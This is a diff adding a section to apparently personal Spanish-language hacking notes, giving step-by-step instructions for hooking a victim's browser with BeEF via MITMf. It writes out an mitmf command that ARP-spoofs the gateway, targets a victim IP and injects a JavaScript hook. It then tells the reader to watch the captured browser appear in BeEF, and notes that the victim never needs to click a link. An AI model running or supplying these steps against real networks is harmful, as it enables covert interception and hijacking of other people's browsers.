@@ -610,6 +610,15 @@ rmdir <nombre directorio> (Borrar directorio)
 --- Dar clic en execute
 --- Volver a la pc de la víctima, el redireccionado ha de haberse llevado a cabo
 
+++ Exploit de navegadores usando Beef (método alternativo: Man in the Middle Framework)
+--- mitmf --arp --spoof --gateway <router_gateway> --target <ip_víctima> -i <interface_ejemplo_eth0 --inject --js-url>
+--- Tomar el hook URL generado
+--- Ir a la pc de la víctima e ingresar a un sitio web
+--- Ir a la interfaz web de beef y en la sección de hooked browsers se nos mostrará la ip del equipo de la víctima
+--- La ventaja de este método es que la víctima no tiene que acceder a ningún url, mas bien el hook url se injecta en el navegador del usuario y este al navegar a cualquier url queda capturado por beef
+
+
+
 
 
 
